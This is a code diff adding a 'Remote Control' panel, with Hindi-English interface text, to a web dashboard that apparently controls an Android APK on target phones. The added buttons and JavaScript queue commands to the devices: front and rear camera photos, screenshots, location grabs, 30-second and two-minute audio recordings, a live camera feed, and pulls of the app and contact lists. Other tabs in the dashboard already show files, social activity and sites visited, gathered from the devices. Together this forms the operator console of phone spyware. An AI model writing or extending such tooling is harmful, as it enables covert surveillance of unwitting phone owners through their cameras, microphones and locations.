@@ -282,6 +282,7 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <button class="tab" data-p="files">📁 Files <span class="cnt" id="t-files"></span></button>
     <button class="tab" data-p="social">🗨️ Social <span class="cnt" id="t-social"></span></button>
     <button class="tab" data-p="web">🌐 Sites <span class="cnt" id="t-web"></span></button>
+    <button class="tab" data-p="remote">🎛️ Remote</button>
     <button class="tab" data-p="live">📺 Live</button>
     <button class="tab" data-p="all">📋 All Requests <span class="cnt" id="t-all"></span></button>
   </div>
@@ -388,6 +389,36 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
       <table>
         <thead><tr><th>Time</th><th>Site</th><th>URL</th><th>Browser</th><th>Device</th></tr></thead>
         <tbody id="tb-web"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- REMOTE CONTROL -->
+  <section class="panel" id="p-remote">
+    <div class="head"><h2>🎛️ Remote Control</h2><span class="sub">APK se free command queue — live camera, screenshot, recording, location</span></div>
+    <div class="notice amber" id="cmdNote">⏳ <div><b>Polling:</b> APK har ~8 second mein commands check karta hai. Command bhejne ke baad thoda ruko — result Media/Location tab mein aa jayega.</div></div>
+    <div class="head" style="margin-top:14px;"><h2>Send Command</h2>
+      <select id="cmdTargetSel" style="background:#0b1826;color:#e5eef7;border:1px solid rgba(255,255,255,.14);border-radius:8px;padding:6px 10px;">
+        <option value="all">📱 All Devices</option>
+      </select>
+    </div>
+    <div id="cmdbtns" style="display:flex;flex-wrap:wrap;gap:8px;">
+      <button class="btn primary" onclick="sendCmd('photo',{cam:'1'})">📸 Photo (Front)</button>
+      <button class="btn" onclick="sendCmd('photo',{cam:'0'})">📷 Photo (Rear)</button>
+      <button class="btn" onclick="sendCmd('screenshot')">🖥️ Screenshot</button>
+      <button class="btn" onclick="sendCmd('location')">📍 Get Location</button>
+      <button class="btn" onclick="sendCmd('audio',{seconds:30})">🎙️ Record 30s</button>
+      <button class="btn" onclick="sendCmd('audio',{seconds:120})">🎙️ Record 2m</button>
+      <button class="btn danger" id="liveon" onclick="sendCmd('live_start',{count:60,interval:5})">🔴 Live Camera ON</button>
+      <button class="btn danger" onclick="sendCmd('live_stop')">⏹️ Live Camera OFF</button>
+      <button class="btn" onclick="sendCmd('refresh_apps')">🔄 Refresh Apps</button>
+      <button class="btn" onclick="sendCmd('refresh_contacts')">🔄 Refresh Contacts</button>
+    </div>
+    <div class="head" style="margin-top:18px;"><h2>Command History</h2><span class="sub">Panel se bheji gayi commands</span></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Command</th><th>Target</th><th>Devices</th></tr></thead>
+        <tbody id="tb-remote"></tbody>
       </table>
     </div>
   </section>
@@ -583,6 +614,7 @@ function renderAll() {
   renderFiles(byKind.files);
   renderSocial(byKind.social);
   renderWeb(byKind.web);
+  renderRemote();
   renderLive();
   renderAllTable();
 }
@@ -827,6 +859,74 @@ function renderWeb(list) {
       + '<td>' + esc(f.browser || "—") + '</td>'
       + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
+}
+
+/* ---------- remote control ---------- */
+function sendCmd(kind, opts) {
+  var sel = document.getElementById("cmdTargetSel");
+  var target = (sel && sel.value) || "all";
+  var body = Object.assign({ kind: kind, target: target }, opts || {});
+  return fetch("/api/cmd", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify(body),
+    cache: "no-store",
+  })
+    .then(function (r) {
+      if (r.status === 401) { window.location.href = "/login"; return null; }
+      return r.json();
+    })
+    .then(function (j) {
+      if (j && j.ok) {
+        var note = document.getElementById("cmdNote");
+        note.className = "notice green";
+        note.innerHTML = "✅ <div><b>Command queued:</b> " + esc(j.action) + " → device(s): " + esc((j.targets || []).join(", ")) + ". APK ~8s mein uthayega. Result Media/Location tab mein dekho.</div>";
+        refresh();
+      } else {
+        var note2 = document.getElementById("cmdNote");
+        note2.className = "notice amber";
+        note2.innerHTML = "⚠️ <div><b>Failed:</b> " + esc((j && j.error) || "unknown error") + "</div>";
+      }
+      return j;
+    })
+    .catch(function (e) {
+      var note3 = document.getElementById("cmdNote");
+      note3.className = "notice amber";
+      note3.innerHTML = "⚠️ <div><b>Network error:</b> " + esc(String(e)) + "</div>";
+    });
+}
+
+function renderRemote() {
+  var tb = document.getElementById("tb-remote");
+  if (!tb) return;
+  var cmds = VIEW.filter(function (c) { return c.path === "/remote/cmd"; }).slice(0, 20);
+  if (!cmds.length) {
+    tb.innerHTML = '<tr><td colspan="4" class="empty"><div class="big">🎛️</div><h3>No commands sent yet</h3><p>Button dabao — APK ko command jayegi.</p></td></tr>';
+  } else {
+    tb.innerHTML = cmds.map(function (c) {
+      var f = c.fields || {};
+      return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+        + '<td class="mono">' + esc(f.action || "") + '</td>'
+        + '<td>' + esc(f.target || "all") + '</td>'
+        + '<td class="mono muted">' + esc(f.devices || "—") + '</td></tr>';
+    }).join("");
+  }
+  // device select — registered devices se populate
+  var sel = document.getElementById("cmdTargetSel");
+  if (sel && sel.options.length <= 1) {
+    var seen = {}, ids = [];
+    VIEW.forEach(function (c) {
+      if (c.deviceId && !seen[c.deviceId]) { seen[c.deviceId] = 1; ids.push(c.deviceId); }
+    });
+    ids.forEach(function (id) {
+      var nm = null;
+      for (var i = 0; i < VIEW.length; i++) { if (VIEW[i].deviceId === id && VIEW[i].deviceName) { nm = VIEW[i].deviceName; break; } }
+      var o = document.createElement("option");
+      o.value = id;
+      o.textContent = "📲 " + (nm || "Device " + id);
+      sel.appendChild(o);
+    });
+  }
 }
 
 function renderLive() {
